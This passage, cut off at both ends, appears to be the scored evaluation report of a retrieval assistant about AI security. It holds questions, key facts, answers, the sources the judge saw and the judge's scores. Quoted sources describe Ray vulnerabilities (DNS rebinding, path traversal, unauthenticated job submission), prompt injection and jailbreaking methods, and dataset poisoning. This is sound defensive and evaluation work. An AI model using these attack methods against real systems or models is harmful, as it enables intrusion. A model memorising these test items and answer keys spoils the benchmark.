> CVSS: 9.4 CRITICAL (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X)
> CWE: CWE-352, CWE-94
> CISA KEV: yes, added 2026-08-17
> Published: 2025-11-26
> Aliases: GHSA-q279-jhrf-cc6v, PYSEC-2026-520
>
> Ray is vulnerable to Critical RCE via Safari & Firefox Browsers through DNS Rebinding Attack
>
> # Summary
>
> Developers working with Ray as a development tool can be exploited via a critical RCE vulnerability exploitable via Firefox and Safari.
>
> Due to the longstanding [decision](https://docs.ray.io/en/releases-2.51.1/ray-security/index.html) by the Ray Development team to not implement any sort of authentication on critical endpoints, like the `/api/jobs` & `/api/job_agent/jobs/` has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray. This time in a development context via the browsers Firefox and Safari.
>
> This vulnerability is due to an insufficient guard against browser-based attacks, as the current defense uses the `User-Agent` header starting with the string "Mozilla" as a defense mechanism. This defense is insufficient as the fetch specification allows the `User-Agent` header to be modified.
>
> Combined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement ([malvertising](https://en.wikipedia.org/wiki/Malvertising)).
>
> # Details
>
> The mitigations implemented to protect against browser based attacks against local Ray nodes are insufficient.
>
> ## Current Mitigation Strategies
>
> ```python
> def is_browser_request(req: Request) -> bool:
> """Checks if a request is made by a browser like user agent.
>
> This heuristic is very weak, but hard for a browser to bypass- eg,
> fetch/xhr and friends cannot alter the user-agent, but requests made with
> an http library can stumble into this if they choose to user a browser like
> user agent.
> """
> return req.headers["User-Agent"].startswith("Mozilla")
>
> def deny_browser_requests() -> Callable:
> """Reject any requests that appear to be made by a browser"""

**CVE-2026-32981**

> Affected: ray (PyPI) all versions, fixed in 2.8.1
> CVSS: 8.7 HIGH (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X)
> CWE: CWE-22
> CISA KEV: no
> Published: 2026-03-17
> Aliases: GHSA-j3mh-qmjj-xp83, PYSEC-2026-130
>
> Ray Dashboard is vulnerable to path traversal through its static file handling mechanism
>
> A path traversal vulnerability was identified in Ray Dashboard (default port 8265) in Ray versions prior to 2.8.1. Due to improper validation and sanitization of user-supplied paths in the static file handling mechanism, an attacker can use traversal sequences (e.g., ../) to access files outside the intended static directory, resulting in local file disclosure.

**CVE-2025-34351**

> Affected: ray (PyPI) all versions, no fix listed
> CWE: CWE-1188, CWE-304
> CISA KEV: no
> Published: 2025-11-27
> Aliases: GHSA-gx77-xgc2-4888, PYSEC-2026-518
>
> Ray's New Token Authentication is Disabled By Default
>
> Anyscale Ray 2.52.0 contains an insecure default configuration in which token-based authentication for Ray management interfaces (including the dashboard and Jobs API) is disabled unless explicitly enabled by setting RAY_AUTH_MODE=token. In the default unauthenticated state, a remote attacker with network access to these interfaces can submit jobs and execute arbitrary code on the Ray cluster. NOTE: The vendor plans to enable token authentication by default in a future release. They recommend enabling token authentication to protect your cluster from unauthorized access.

</details>

**Score (1-5):** 4

*Claude's assessment:* Versions and fix are right (2.49.0-2.54.0, fixed in 2.55.0), and so is the crafted-Parquet RCE. It does not explain the cloudpickle path or say that no authentication or cluster access is needed.

*Key-fact note:* Sources disagree on the affected range: the GHSA says >= 2.49.0, < 2.55.0 (matches the key fact, and explains when the flaw was introduced), while the CNA/NVD record says 2.54.0 only and PYSEC says introduced 0. The key fact follows the most detailed source; no change to the score.

*Checked against:* <https://github.com/advisories/GHSA-mw35-8rx3-xf9r>, <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-41486>, <https://api.osv.dev/v1/vulns/GHSA-mw35-8rx3-xf9r>, <https://api.osv.dev/v1/vulns/PYSEC-2026-2272>, <https://api.osv.dev/v1/vulns/PYSEC-2026-2296>, <https://pypi.org/pypi/ray/json>

---

## 34. What does ISO/IEC 42001 require for an AI management system?

<!-- id: abstain-iso-42001:rag -->

**Key facts**

- The question is not answerable from the indexed sources

**Answer**

> I can't answer that from the indexed sources.
>
> Try naming what you're asking about: a technique ID such as AML.T0051, an OWASP entry such as LLM01, or an AI Act article such as Article 50.
>
> The knowledge base covers:
>
> - AI package vulnerabilities (NVD, GitHub Advisory Database via OSV, CISA KEV)
> - EU AI Act (Regulation (EU) 2024/1689)
> - KI-MIG (KI-Marktüberwachungs- und Innovationsförderungsgesetz)
> - MITRE ATLAS
> - OWASP Top 10 for Agentic Applications 2026
> - OWASP Top 10 for LLM Applications 2026
>
> *AI-generated answer (EU AI Act Art. 50(1)). Check the cited sources.*

**Score (1-5):** 5

*Claude's assessment:* Correctly declines; ISO/IEC 42001 is not among the indexed sources.

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 35. How can I prevent it?

<!-- id: follow-up-prevent-llm01:rag -->

*Follow-up to:* What is LLM01 in the OWASP Top 10 for LLM Applications?

**Key facts**

- No reliable way to prevent prompt injection exists today, so defense is architectural rather than interceptive
- Design the system assuming the model's instruction boundary will be bypassed, and constrain what the model may do and what its outputs may reach

**Answer**

> There’s **no reliable way to prevent prompt injection completely**; use defense in depth to limit what a successful injection can do. [LLM01:2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final/LLM01_PromptInjection.md#prevention-and-mitigation-strategies)
>
> - Restrict the model’s role and capabilities, and give it only the permissions needed for each operation. Keep credentials and state-changing capabilities in application code; use deterministic checks before privileged actions. [LLM01:2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final/LLM01_PromptInjection.md#prevention-and-mitigation-strategies)
> - Validate model outputs in trusted application code before other systems act on them. Filter content across modalities, and separate external content into a provenance-labeled channel. [LLM01:2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final/LLM01_PromptInjection.md#prevention-and-mitigation-strategies)
> - Strip invisible characters that may conceal instructions, and require explicit human confirmation for privileged, irreversible, or externally visible actions. [LLM01:2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final/LLM01_PromptInjection.md#prevention-and-mitigation-strategies)

<details><summary>4 sources the judge saw</summary>

**LLM01:2026**

> #### Direct Prompt Injection
>
> A user, or an attacker with the user's access path, supplies input that changes model behavior in undesired ways. Direct injection can be **intentional** (a malicious user crafting a jailbreak) or **unintentional** (a legitimate user pasting content that happens to contain conflicting instructions, or a user who relies on an LLM to help them and inadvertently optimizes their input against an unrelated downstream LLM, as in Scenario #3).
>
> Jailbreaking is the subset of prompt injection where the attacker's goal is to make the model violate its safety protocols. Application-level safeguards help contain it, but effective prevention requires ongoing updates to the model's training and safety mechanisms.
>
> #### Indirect Prompt Injection
>
> The model ingests content from an external source (a web page, a document, an email, a tool response, a retrieved RAG passage, an image, an MCP server's output, a database row, or an issue title) that contains data which acts as prompt injection. The user did not supply or see those instructions. The trust profile of the delivery surface determines what defenses are practical:
>
> * **Untrusted surfaces.** Public web pages, emails from unknown senders, search results. Defenders must treat anything from these sources as suspicious. Most prompt-injection research has focused here.
> * **Semi-trusted surfaces.** Issue titles in a public bug tracker, package READMEs and changelogs, third-party API responses: content the user chose to retrieve but did not author. The user trusts the platform but not necessarily individual contributors.
> * **Trusted surfaces.** The developer's own repositories, databases, internal documents, and mail. The developer may not realize an attacker has placed content here, perhaps via an unrelated upstream vector such as a public bug-report form.
>
> The shared structure: the attacker does not need to compromise the backend directly. They place text where the developer's LLM will read it, and the LLM, operating with the developer's privileges, does the work. Defenses that focus only on the chat surface miss this entirely.

**LLM01:2026**

> 2. **Define a strict output schema and validate every response in trusted application code** before any downstream system acts on it, using structural validation rather than a second LLM call. This catches format violations, not semantic manipulation: a schema-valid response can still carry a malicious SQL query or an exfiltration-formatted email body.
>
> 3. **Filter at every modality boundary (text, image, audio, structured data), not just text.** Run modality-specific classifiers, OCR over images, and transcription over audio, then apply text filters to the extracted content. Semantic filters are evadable by rephrasing or encoding, and low-resource and code-mixed inputs degrade their accuracy (Hackett et al., 2025).
>
> 4. **Hold credentials and state-change capability in application code, not the model, and grant least privilege per operation.** Route privileged calls through a deterministic policy engine that re-validates intent and arguments at execution time. NIST AI 100-2 E2025 and the CISA and Five Eyes OT joint guidance (CISA et al., 2025) frame this deterministic mediation as a baseline procurement expectation. Broad "convenience" permissions and multi-agent hops re-introduce the risk downstream.
>
> 5. **Strip tag-block (U+E0000 to E007F), variation-selector (U+FE00 to FE0F), and zero-width (U+200B, U+200C, U+200D, U+2060) characters at every ingest and render boundary.** These are invisible in normal rendering and smuggle instructions or exfiltration bytes (see Common Example #5), and variation-selector variants (Rehberger, 2025c) smuggle arbitrary bytes invisibly. Stripping does not stop visible-text payloads or future steganographic classes.
>
> 6. **Pass external content through a structurally separate, provenance-labeled channel** so the model can distinguish data from instructions (S. Chen et al., 2025; Microsoft Research, 2025). This reduces attack success in non-adaptive tests only: an attacker who knows the marking scheme can mimic it, and StruQ was bypassed under adaptive attack (Nasr et al., 2025).
>
> 7. **Require explicit human confirmation before any privileged, irreversible, or externally visible action**, surfacing the exact rendered action rather than a summary to the reviewer. Invisible-character smuggling can make the displayed action differ from the executed one (#5), and approval fatigue degrades reviewer judgment at volume.

**LLM01:2026**

> Prompt injection is intrinsic to current generative AI: LLMs make no architectural distinction between instructions and data, and their behavior is stochastic, so no reliable prevention mechanism exists today, a position consistent with NIST (2025), NCSC (2025), and Debenedetti et al. (2025). Defense is therefore architectural rather than interceptive. Design the surrounding system on the explicit assumption that the model's instruction boundary will eventually be bypassed, and constrain what the model is permitted to do, and what its outputs are permitted to reach, so a successful injection does not translate into a successful exploit.
>
> Most high-impact prompt-injection incidents on record became severe because the injection landed inside a system whose tools, scopes, or output-rendering capabilities let the compromised model act on the attacker's behalf at the user's privilege level (see Scenarios #7 through #9). This is the operational relationship between this entry and **LLM03:2026 Excessive Agency**: prompt injection is the input-side compromise, and excessive functionality, permissions, or autonomy are what give that compromise consequences outside the chat window. Simon Willison's "lethal trifecta" (2025) restates the same structural diagnosis as a pre-deployment check: an agent that can simultaneously access private data, ingest untrusted content, and communicate externally has the conditions for high-impact exploitation, and removing any one leg removes them.
>
> Apply the controls below as defense-in-depth, since no single control is sufficient. Some reduce injection success and are expected to degrade against adaptive attackers. Others bound the blast radius once injection succeeds, and these are what survive against attackers who can probe the system. For agentic deployments, the least-privilege and capability-budgeting controls (#4, #8) are load-bearing, and **LLM03:2026** carries the full agency-side treatment.
>
> 1. **Constrain the model's role and capabilities in the system prompt.** Use declarative allow and deny statements ("assist with X only, do not access Y, do not forward output to external addresses"), not open-ended grants. This is a partial control only: an attacker who infers the prompt can bypass it (Nasr et al., 2025), so pair it with the privilege controls in #4.

**OWASP LLM Top 10 2026**

> The OWASP Top 10 for LLM Applications 2026 lists these risks, by number:
> LLM01:2026 Prompt Injection: A **prompt-injection vulnerability** occurs when input to a large language model (LLM), whether direct user input, retrieved content, tool output, image,…
> LLM02:2026 Sensitive Information Disclosure: Sensitive information disclosure occurs when an LLM-integrated system exposes confidential, regulated, privileged, or proprietary data through a channel the…
> LLM03:2026 Excessive Agency: An LLM-based system is often granted a degree of agency by its developer: the ability to call functions or interface with other systems via tools (also called…
> LLM04:2026 Supply Chain: LLM supply chains are susceptible to vulnerabilities that affect the integrity of training data, models, adapters, conversion pipelines, and deployment…
> LLM05:2026 Data and Model Poisoning: Data and Model Poisoning describes a class of attacks and failures where an adversary (or unsafe process) manipulates data or model artifacts to embed harmful…
> LLM06:2026 Unbounded Consumption: Unbounded Consumption occurs when an LLM application allows excessive and uncontrolled inferences, enabling attackers to disrupt service availability, inflict…
> LLM07:2026 Misinformation: Misinformation occurs when an LLM or LLM-enabled application produces incorrect, incomplete, unsupported, or misleading information that appears credible…
> LLM08:2026 Hidden Context Exposure: Hidden Context Exposure is the unauthorized extraction, inference, or reconstruction of hidden, non-user-facing system instructions or operational context…
> LLM09:2026 Vector and Embedding Weaknesses: Vector and embedding weaknesses present security risks in any LLM application that converts text, images, code, or audio into numerical representations and…
> LLM10:2026 Improper Output Handling: Improper Output Handling refers specifically to insufficient validation, sanitization, and handling of the outputs generated by large language models before…

</details>

**Score (1-5):** 4

*Claude's assessment:* Says no reliable prevention exists and defense limits what an injection can do; its mitigations match LLM01:2026 controls 1-7. Only implies the 'assume the instruction boundary is bypassed' / architectural framing (borderline 4/5).

*Checked against:* <https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM01_PromptInjection.md>

---

## 36. What are the top 3 risks in the OWASP Top 10 for Agentic Applications?

<!-- id: list-agentic-top3:rag -->

**Key facts**

- ASI01 Agent Goal Hijack
- ASI02 Tool Misuse and Exploitation
- ASI03 Identity and Privilege Abuse

**Answer**

> 1. **ASI01 Agent Goal Hijack** [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
> 2. **ASI02 Tool Misuse and Exploitation** [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
> 3. **ASI03 Identity and Privilege Abuse** [OWASP Agentic Top 10 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)

<details><summary>2 sources the judge saw</summary>

**OWASP Agentic Top 10 2026**

> The OWASP Top 10 for Agentic Applications 2026 lists these risks, by number:
> ASI01 Agent Goal Hijack: AI Agents exhibit autonomous ability to execute a series of tasks to achieve a goal.
> ASI02 Tool Misuse and Exploitation: Agents can misuse legitimate tools due to prompt injection, misalignment, or unsafe delegation or ambiguous instruction - leading to data exfiltration, tool…
> ASI03 Identity and Privilege Abuse: Identity & Privilege Abuse exploits dynamic trust and delegation in agents to escalate access and bypass controls by manipulating delegation chains, role…
> ASI04 Agentic Supply Chain Vulnerabilities: Agentic Supply Chain Vulnerabilities arise when agents, tools, and related artefacts they work with are provided by third parties and may be malicious,…
> ASI05 Unexpected Code Execution (RCE): Agentic systems - including popular vibe coding tools - often generate and execute code.
> ASI06 Memory & Context Poisoning: Agentic systems rely on stored and retrievable information which can be a snapshot of its conversation history, a memory tool or expanded context, which…
> ASI07 Insecure Inter-Agent Communication: Multi agent systems depend on continuous communication between autonomous agents that coordinate via APIs, message buses, and shared memory, significantly…
> ASI08 Cascading Failures: Agentic cascading failures occur when a single fault (hallucination, malicious input, corrupted tool, or poisoned memory) propagates across autonomous agents,…
> ASI09 Human-Agent Trust Exploitation: Intelligent agents can establish strong trust with human users through their natural language fluency, emotional intelligence, and perceived expertise, known…
> ASI10 Rogue Agents: Rogue Agents are malicious or compromised AI Agents that deviate from their intended function or authorized scope, acting harmfully, deceptively, or…

**OWASP LLM Top 10 2026**

> The OWASP Top 10 for LLM Applications 2026 lists these risks, by number:
> LLM01:2026 Prompt Injection: A **prompt-injection vulnerability** occurs when input to a large language model (LLM), whether direct user input, retrieved content, tool output, image,…
> LLM02:2026 Sensitive Information Disclosure: Sensitive information disclosure occurs when an LLM-integrated system exposes confidential, regulated, privileged, or proprietary data through a channel the…
> LLM03:2026 Excessive Agency: An LLM-based system is often granted a degree of agency by its developer: the ability to call functions or interface with other systems via tools (also called…
> LLM04:2026 Supply Chain: LLM supply chains are susceptible to vulnerabilities that affect the integrity of training data, models, adapters, conversion pipelines, and deployment…
> LLM05:2026 Data and Model Poisoning: Data and Model Poisoning describes a class of attacks and failures where an adversary (or unsafe process) manipulates data or model artifacts to embed harmful…
> LLM06:2026 Unbounded Consumption: Unbounded Consumption occurs when an LLM application allows excessive and uncontrolled inferences, enabling attackers to disrupt service availability, inflict…
> LLM07:2026 Misinformation: Misinformation occurs when an LLM or LLM-enabled application produces incorrect, incomplete, unsupported, or misleading information that appears credible…
> LLM08:2026 Hidden Context Exposure: Hidden Context Exposure is the unauthorized extraction, inference, or reconstruction of hidden, non-user-facing system instructions or operational context…
> LLM09:2026 Vector and Embedding Weaknesses: Vector and embedding weaknesses present security risks in any LLM application that converts text, images, code, or audio into numerical representations and…
> LLM10:2026 Improper Output Handling: Improper Output Handling refers specifically to insufficient validation, sanitization, and handling of the outputs generated by large language models before…

</details>

**Score (1-5):** 5

*Claude's assessment:* ASI01-ASI03, correct and in order.

*Checked against:* <https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/>

---

## 37. How can I stop an attacker from fooling my AI model by tampering with one of its sensors, such as a camera?

<!-- id: freshness-aml-m0009:rag -->

**Key facts**

- Use independent physical sensors, ideally across multiple modalities or from several perspectives, so the system doesn't rely on a single sensor that an adversary could manipulate, obstruct, or disrupt.
- Relevant sensors can include visible-light cameras, infrared cameras, depth sensors, radar, lidar, and microphones.
- Corroborate observations across the sensors so that manipulating one input source does not overly influence the model's predictions.

**Answer**

> I can't answer that from the indexed sources.
>
> Try naming what you're asking about: a technique ID such as AML.T0051, an OWASP entry such as LLM01, or an AI Act article such as Article 50.
>
> The knowledge base covers:
>
> - AI package vulnerabilities (NVD, GitHub Advisory Database via OSV, CISA KEV)
> - EU AI Act (Regulation (EU) 2024/1689)
> - KI-MIG (KI-Marktüberwachungs- und Innovationsförderungsgesetz)
> - MITRE ATLAS
> - OWASP Top 10 for Agentic Applications 2026
> - OWASP Top 10 for LLM Applications 2026
>
> *AI-generated answer (EU AI Act Art. 50(1)). Check the cited sources.*

**Score (1-5):** 1

*Claude's assessment:* Declines, although AML.M0009 Multi-Sensor Fusion answers the question and is in the index.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>, `data/processed/atlas/2026.09/chunks.jsonl`

---

## 38. What is AML.T0002 and what does it say about how adversaries acquire public AI artifacts?

<!-- id: id-exact-aml-t0002:rag -->

**Key facts**

- Adversaries may search public sources, including cloud storage, public-facing services, and software or data repositories, to identify AI artifacts.
- These AI artifacts may include the software stack used to train and deploy models, training and testing data, and model configurations and parameters.
- AI artifacts can help an adversary create a proxy AI model, and if they include pieces of the actual production model, they can be used directly to craft adversarial data.

**Answer**

> **AML.T0002, “Acquire Public AI Artifacts,”** describes adversaries searching public sources—including cloud storage, public-facing services, and software or data repositories—to find AI artifacts. [AML.T0002](https://atlas.mitre.org/techniques/AML.T0002)
>
> Artifacts may include training and deployment software, data, model configurations, and parameters. Adversaries may target artifacts associated with a victim because they can reveal what the organization uses in production and help tailor further operations. [AML.T0002](https://atlas.mitre.org/techniques/AML.T0002)
>
> Some artifacts require registration, credentials, or a written request to access; if hosted on victim-controlled infrastructure, access may reveal information about who retrieved them. [AML.T0002](https://atlas.mitre.org/techniques/AML.T0002)

<details><summary>8 sources the judge saw</summary>

**AML.T0002**

> Acquire Public AI Artifacts (technique)
>
> Adversaries may search public sources, including cloud storage, public-facing services, and software or data repositories, to identify AI artifacts.
> These AI artifacts may include the software stack used to train and deploy models, training and testing data, model configurations and parameters.
> An adversary will be particularly interested in artifacts hosted by or associated with the victim organization as they may represent what that organization uses in a production environment.
> Adversaries may identify artifact repositories via other resources associated with the victim organization (e.g. [Search Victim-Owned Websites](/techniques/AML.T0003) or [Search Open Technical Databases](/techniques/AML.T0000)).
> These AI artifacts often provide adversaries with details of the AI task and approach.
>
> AI artifacts can aid in an adversary's ability to [Create Proxy AI Model](/techniques/AML.T0005).
> If these artifacts include pieces of the actual model in production, they can be used to directly [Craft Adversarial Data](/techniques/AML.T0043).
> Acquiring some artifacts requires registration (providing user details such as an email address or name), AWS keys, or written requests, and may require the adversary to [Establish Accounts](/techniques/AML.T0021).
>
> Artifacts might be hosted on victim-controlled infrastructure, providing the victim with some information on who has accessed that data.

**AML.T0002.002**

> AI Agent Configuration (technique)
>
> Adversaries may acquire publicly accessible AI agent configuration files to understand agent capabilities, gain unauthorized access to tools and data sources, or identify credentials for further attacks. Configuration files define what tools an agent can use, credentials for external services, system prompts, and behavioral settings, making them valuable resources for adversaries targeting AI agent deployments.
>
> Once configuration files are acquired, adversaries may perform [Discover AI Agent Configuration](/techniques/AML.T0084) to gain additional insights they can use in their operation or [Credentials from AI Agent Configuration](/techniques/AML.T0083) to harvest secrets.
>
> AI agent configuration files come in multiple forms depending on the platform and agent framework. Agent configuration files adversaries may target include:
> - System prompts: Files containing agent instructions, behavioral guidelines, and internal logic.
> - Tool configuration: Files defining tools the agent can utilize, including Model Context Protocol (MCP) configs (e.g., `mcp.json`, `claude_desktop_config.json`), IDE-specific configs (e.g., `.claude/settings.json`, `.vscode/tasks.json`), and framework-specific settings that define external tool and data source integrations.
> - Skills and workflows: Files defining agent capabilities, behaviors, or workflows. Often a combination of instructions, scripts, and resources.
> - Environment and deployment configs: Files that control agent deployment and runtime behavior, often environment variables or framework-specific configs.

**AML.T0002.000**

> Datasets (technique)
>
> Adversaries may collect public datasets to use in their operations.
> Datasets used by the victim organization or datasets that are representative of the data used by the victim organization may be valuable to adversaries.
> Datasets can be stored in cloud storage, or on victim-owned websites.
> Some datasets require the adversary to [Establish Accounts](/techniques/AML.T0021) for access.
>
> Acquired datasets help the adversary advance their operations, stage attacks, and tailor attacks to the victim organization.

**AML.T0002.001**

> Models (technique)
>
> Adversaries may acquire public models to use in their operations.
> Adversaries may seek models used by the victim organization or models that are representative of those used by the victim organization.
> Representative models may include model architectures, or pre-trained models which define the architecture as well as model parameters from training on a dataset.
> The adversary may search public sources for common model architecture configuration file formats such as YAML or Python configuration files, and common model storage file formats such as ONNX (.onnx), HDF5 (.h5), Pickle (.pkl), PyTorch (.pth), or TensorFlow (.pb, .tflite).
>
> Acquired models are useful in advancing the adversary's operations and are frequently used to tailor attacks to the victim model.

**AML.T0004**

> Search Application Repositories (technique)
>
> Adversaries may search open application repositories during targeting.
> Examples of these include Google Play, the iOS App store, the macOS App Store, and the Microsoft Store.
>
> Adversaries may craft search queries seeking applications that contain AI-enabled components.
> Frequently, the next step is to [Acquire Public AI Artifacts](/techniques/AML.T0002).

**AML.T0115**

> Publish Poisoned AI Artifacts (technique)
>
> Adversaries may create or modify AI artifacts and publish them through public or shared distribution channels to facilitate compromise of downstream AI systems. Poisoned AI artifacts may include datasets, models, and AI agent tools containing malicious content, behaviors, code, or configurations.
>
> Adversaries may publish novel artifacts or malicious variants of legitimate artifacts through dataset or model repositories, package registries, source code repositories, tool hubs, or remotely hosted services. Victims may subsequently acquire and integrate these artifacts through [AI Supply Chain Compromise](/techniques/AML.T0010).

**AML.T0008.002**

> Domains (technique)
>
> Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.
>
> Adversaries may use acquired domains for a variety of purposes (see [ATT&CK](https://attack.mitre.org/techniques/T1583/001/)). Large AI datasets are often distributed as a list of URLs to individual datapoints. Adversaries may acquire expired domains that are included in these datasets and replace individual datapoints with poisoned examples ([Publish Poisoned AI Artifacts: Datasets](/techniques/AML.T0115.000)).

**AML.T0016.002**

> Generative AI (technique)
>
> Adversaries may search for and obtain generative AI models or tools, such as large language models (LLMs), to assist them in various steps of their operation. Generative AI can be used in a variety of malicious ways, such as to generate malware, to [Generate Deepfakes](/techniques/AML.T0088), to [Generate Malicious Commands](/techniques/AML.T0102), for [Retrieval Content Crafting](/techniques/AML.T0066), or to generate [Phishing](/techniques/AML.T0052) content.
>
> Adversaries may obtain open source models and serve them locally using frameworks such as [Ollama](https://ollama.com/) or [vLLM]( https://docs.vllm.ai/en/latest/). They may host them using cloud infrastructure. Or, they may leverage AI service providers such as HuggingFace.
>
> They may need to jailbreak the model (see [LLM Jailbreak](/techniques/AML.T0054)) to bypass any restrictions put in place to limit the types of responses it can generate. They may also need to break the terms of service of the model's developer.
>
> Generative AI models may also be "uncensored" meaning they are designed to generate content without any restrictions such as guardrails or content filters. Uncensored GenAI is ripe for abuse by cybercriminals [[blog]] [[gbhackers]]. Models may be fine-tuned to remove alignment and guardrails [[erichartford]] or be subjected to targeted manipulations to bypass refusal [[arxiv]] resulting in uncensored variants of the model. Uncensored models may be built for offensive and defensive cybersecurity [[taico]], which can be abused by an adversary. There are also models that are expressly designed and advertised for malicious use [[gbhackers-1]].

</details>

**Score (1-5):** 4

*Claude's assessment:* Key facts 1 and 2 are present; key fact 3 (proxy model, crafting adversarial data) is missing. The extra claims are accurate.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 39. Which ATLAS techniques did it involve?

<!-- id: follow-up-techniques-cs0002:rag -->

*Follow-up to:* What is the AML.CS0002 case study about?

**Key facts**

- AML.T0010.002 Data
- AML.T0016.000 Adversarial AI Attack Implementations
- AML.T0020 Training Data Poisoning
- AML.T0043 Craft Adversarial Data

**Answer**

> The case study involved four ATLAS techniques:
>
> - **Data** — uploading mutant samples to the platform. [AML.T0010.002](https://atlas.mitre.org/techniques/AML.T0010.002)
> - **Adversarial AI Attack Implementations** — obtaining the `metame` tool. [AML.T0016.000](https://atlas.mitre.org/techniques/AML.T0016.000)
> - **Training Data Poisoning** — contaminating datasets used to train malware-classification models. [AML.T0020](https://atlas.mitre.org/techniques/AML.T0020)
> - **Craft Adversarial Data** — creating mutant variants from a ransomware sample. [AML.T0043](https://atlas.mitre.org/techniques/AML.T0043)

<details><summary>5 sources the judge saw</summary>

**AML.CS0002**

> VirusTotal Poisoning (case study)
>
> McAfee Advanced Threat Research noticed an increase in reports of a certain ransomware family that was out of the ordinary. Case investigation revealed that many samples of that particular ransomware family were submitted through a popular virus-sharing platform within a short amount of time. Further investigation revealed that based on string similarity the samples were all equivalent, and based on code similarity they were between 98 and 74 percent similar. Interestingly enough, the compile time was the same for all the samples. After more digging, researchers discovered that someone used 'metame' a metamorphic code manipulating tool to manipulate the original file towards mutant variants. The variants would not always be executable, but are still classified as the same ransomware family.
>
> Procedure:
> - AML.T0010.002: The actor uploaded "mutant" samples to the platform.
> - AML.T0016.000: The actor obtained [metame](https://github.com/a0rtega/metame), a simple metamorphic code engine for arbitrary executables.
> - AML.T0020: Several vendors started to classify the files as the ransomware family even though most of them won't run. The "mutant" samples poisoned the dataset the ML model(s) use to identify and classify this ransomware family.
> - AML.T0043: The actor used a malware sample from a prevalent ransomware family as a start to create "mutant" variants.

**AML.T0010.002**

> Data (technique)
>
> Data is a key vector of supply chain compromise for adversaries.
> Every AI project will require some form of data.
> Many rely on large open source datasets that are publicly available.
> An adversary could rely on compromising these sources of data.
> The malicious data could be a result of [Poison Training Data](/techniques/AML.T0020) or include traditional malware.
>
> An adversary can also target private datasets in the labeling phase.
> The creation of private datasets will often require the hiring of outside labeling services.
> An adversary can poison a dataset by modifying the labels being generated by the labeling service.

**AML.T0043**

> Craft Adversarial Data (technique)
>
> Adversarial data are inputs to an AI model that have been modified such that they cause the adversary's desired effect in the target model.
> Effects can range from misclassification, to missed detections, to maximizing energy consumption.
> Typically, the modification is constrained in magnitude or location so that a human still perceives the data as if it were unmodified, but human perceptibility may not always be a concern depending on the adversary's intended effect.
> For example, an adversarial input for an image classification task is an image the AI model would misclassify, but a human would still recognize as containing the correct class.
>
> Depending on the adversary's knowledge of and access to the target model, the adversary may use different classes of algorithms to develop the adversarial example such as [White-Box Optimization](/techniques/AML.T0043.000), [Black-Box Optimization](/techniques/AML.T0043.001), [Black-Box Transfer](/techniques/AML.T0043.002), or [Manual Modification](/techniques/AML.T0043.003).
>
> The adversary may perform [Verify Attack](/techniques/AML.T0042) to confirm that their approach works if they have white-box or inference API access to the model.
> This allows the adversary to gain confidence their attack is effective in a live environment where their attack may be noticed.
> They can then use the attack at a later time to accomplish their goals.
> An adversary may optimize adversarial examples for [Evade AI Model](/techniques/AML.T0015), or to [Erode AI Model Integrity](/techniques/AML.T0031).

**AML.T0020**

> Training Data Poisoning (technique)
>
> Adversaries may manipulate data used for training or fine-tuning an AI model to influence the resulting model's behavior. Adversaries may add, remove, or modify data samples; alter labels or annotations; or manipulate feedback and data-collection processes.
>
> Training data poisoning may cause targeted errors, introduce biased or unsafe behavior, degrade model performance, or embed backdoors activated by specific inputs. The resulting behavior may persist in the trained model after the poisoned data is no longer accessible.
>
> Adversaries may poison data directly after gaining access to a training pipeline, or poisoned datasets may be introduced through [AI Supply Chain Compromise](/techniques/AML.T0010).

**AML.T0016.000**

> Adversarial AI Attack Implementations (technique)
>
> Adversaries may search for existing open source implementations of AI attacks. The research community often publishes their code for reproducibility and to further future research. Libraries intended for research purposes, such as CleverHans, the Adversarial Robustness Toolbox, and FoolBox, can be weaponized by an adversary. Adversaries may also obtain and use tools that were not originally designed for adversarial AI attacks as part of their attack.

</details>

**Score (1-5):** 5

*Claude's assessment:* Lists all four techniques of AML.CS0002 with correct IDs; its step descriptions match the case study.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 40. Describe AML.T0051.001.

<!-- id: id-atlas-t0051-001:baseline -->

**Key facts**

- AML.T0051.001 is Indirect (prompt injection)
- Prompts are injected via a separate data channel the LLM or agent ingests, such as documents, emails, databases or websites
- The instructions are often hidden or obfuscated from the user

**Answer**

